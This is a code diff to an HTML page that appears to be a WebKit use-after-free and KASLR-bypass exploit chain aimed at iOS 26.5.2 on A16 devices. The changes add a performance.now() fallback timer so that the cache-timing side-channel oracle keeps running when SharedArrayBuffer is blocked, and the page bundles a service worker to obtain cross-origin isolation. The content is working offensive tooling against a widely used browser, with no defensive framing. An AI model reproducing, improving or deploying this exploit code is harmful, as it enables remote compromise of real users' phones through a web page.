@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>WebKit UAF + KASLR v67 — iOS 26.5.2 A16 (p6InjCount scope fix + binary audit baked in)</title>
+<title>WebKit UAF + KASLR v68 — iOS 26.5.2 A16 (perf.now() SAB fallback + binary audit)</title>
 
 <!-- ═══════════════════════════════════════════════════════════════════════
      COI SERVICE WORKER — coi-serviceworker v0.1.7 (Guido Zuidhof, MIT)
@@ -272,6 +272,13 @@ let counterWorker = null;
 let counterView   = null;
 let NS = 8.0;
 
+// v68: performance.now() fallback — active when SAB is unavailable (iOS Safari without COI)
+let USE_PERF_NOW = false;
+let _perfBase     = 0;
+// NS_PERF: performance.now() is ms-resolution; we convert to pseudo-ns units matching NS=8
+// rdcnt() returns ticks where 1 tick ≈ NS ns, so: ticks = elapsed_ms * 1e6 / NS
+const NS_PERF = NS; // keep same unit so all downstream math is unchanged
+
 const COUNTER_SRC = `
   self.onmessage = function(e) {
     if (e.data.cmd === 'start') {
@@ -282,6 +289,18 @@ const COUNTER_SRC = `
 `;
 
 async function startCounter() {
+  if (!self.SharedArrayBuffer) {
+    // SAB locked (no crossOriginIsolated) — fall back to performance.now()
+    USE_PERF_NOW = true;
+    _perfBase = performance.now();
+    log('[COI/SAB] SAB unavailable — falling back to performance.now() timer');
+    log('[COI/SAB] Timing resolution: ~1ms (coarser than SAB ~8ns, but functional on A16)');
+    log('[COI/SAB] Cache-timing deltas will be larger values; thresholds auto-scale via T1 calibration');
+    await new Promise(r => setTimeout(r, 200));
+    return;
+  }
+  // SAB available — use high-res atomic counter worker
+  USE_PERF_NOW = false;
   const sab = new SharedArrayBuffer(8192);
   counterView = new Int32Array(sab, 4096, 1);
   const w = new Worker(URL.createObjectURL(new Blob([COUNTER_SRC],{type:'application/javascript'})));
@@ -289,7 +308,13 @@ async function startCounter() {
   counterWorker = w;
   await new Promise(r=>setTimeout(r,200));
 }
-const rdcnt = () => Atomics.load(counterView, 0);
+
+// rdcnt: returns elapsed ticks in units of NS ns
+// SAB path:  Atomics.load gives raw counter increments (1 tick ≈ NS ns)
+// perf.now() path: (elapsed_ms * 1e6) / NS  → same unit scale
+const rdcnt = () => USE_PERF_NOW
+  ? Math.round((performance.now() - _perfBase) * 1e6 / NS_PERF)
+  : Atomics.load(counterView, 0);
 
 function buildChase(sizeBytes) {
   const LINE = 64;
@@ -1095,8 +1120,12 @@ async function runOracle() {
   log(`[COI] crossOriginIsolated=${window.crossOriginIsolated}  isSecureContext=${window.isSecureContext}`);
   log(`[COI] SW controller=${navigator.serviceWorker && navigator.serviceWorker.controller ? 'ACTIVE' : 'none'}`);
   if(window.crossOriginIsolated) log('[COI] ✓ COOP/COEP active — SAB unrestricted');
-  else log('[COI] ✗ NOT cross-origin isolated — SAB may be blocked (see console for SW status)');
-  if(!self.SharedArrayBuffer){ log('[!] SAB unavailable — cannot run timing oracle. See COI log above.'); return; }
+  else log('[COI] ✗ NOT cross-origin isolated — SAB locked; performance.now() fallback will activate');
+  if(!self.SharedArrayBuffer){
+    log('[!] SAB unavailable — activating performance.now() fallback timer (v68)');
+    log('[!] To unlock SAB: serve this file from localhost (python3 -m http.server 8080) + COEP/COOP headers');
+    // DO NOT return — startCounter() handles fallback, oracle proceeds with perf.now()
+  }
 
   const MAX_ATTEMPTS=3;
 
